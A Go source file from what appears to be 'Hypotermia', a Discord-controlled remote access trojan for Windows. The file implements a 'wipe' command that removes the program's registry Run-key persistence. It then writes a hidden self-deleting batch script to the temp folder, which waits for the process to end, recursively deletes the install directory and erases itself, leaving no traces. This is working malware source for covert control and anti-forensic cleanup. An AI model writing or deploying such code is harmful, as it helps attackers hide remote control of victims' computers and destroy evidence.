package commands

import (
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"syscall"
	"time"

	"Hypotermia/config"
	"Hypotermia/src/utils"

	"github.com/bwmarrin/discordgo"
)

const (
	wipeRegError    string = "🟥 Failed to get registry key."
	wipeDeReglError string = "🟥 Failed to delete registry key."
	wipePathError   string = "🟥 Failed to get the path."
	wipeDelError    string = "🟥 Failed to delete hypotermia."
	wipeKillError   string = "🟥 Failed to kill hypotermia."
)

type WipeCommand struct{}

func (*WipeCommand) Run(s *discordgo.Session, m *discordgo.MessageCreate, args []string) error {
	if !config.Debugging {
		_, err := utils.GetRegistry(
			"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
			config.HypotermiaName,
		)

		if err != nil {
			_, err := s.ChannelMessageSendReply(m.ChannelID, wipeRegError, m.Reference())
			return err
		}

		err = utils.DelRegistry(
			"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
			config.HypotermiaName,
		)

		if err != nil {
			_, err := s.ChannelMessageSendReply(m.ChannelID, wipeDeReglError, m.Reference())
			return err
		}
	}

	path, err := os.Executable()
	if err != nil {
		_, err := s.ChannelMessageSendReply(m.ChannelID, wipePathError, m.Reference())
		return err
	}

	path, _ = filepath.Abs(path)
	dir := filepath.Dir(path)

	script := filepath.Join(os.TempDir(), "wowza.bat")
	utils.HideItem(script)

	content := fmt.Sprintf(
		"@echo off\n"+
			":check\n"+
			"tasklist | find \"Hypotermia.exe\" >nul\n"+
			"if not errorlevel 1 (\n"+
			"  timeout /t 1 >nul\n"+
			"  goto :check\n"+
			")\n"+
			"timeout /t 2 >nul\n"+
			"rmdir /s /q \"%s\"\n"+
			"del \"%%~f0\"\n",
		dir,
	)

	err = os.WriteFile(script, []byte(content), 0644)
	if err != nil {
		_, err := s.ChannelMessageSendReply(m.ChannelID, wipeDelError, m.Reference())
		return err
	}

	cmd := exec.Command("cmd.exe", "/C", "start", "/b", script)
	cmd.SysProcAttr = &syscall.SysProcAttr{
		HideWindow: true,
	}

	err = cmd.Start()
	if err != nil {
		_, err := s.ChannelMessageSendReply(m.ChannelID, wipeDelError, m.Reference())
		return err
	}

	time.Sleep(500 * time.Millisecond)

	os.Exit(0)
	return nil
}

func (*WipeCommand) Name() string {
	return "wipe"
}

func (*WipeCommand) Info() string {
	return "removes hypotermia and all its traces"
}
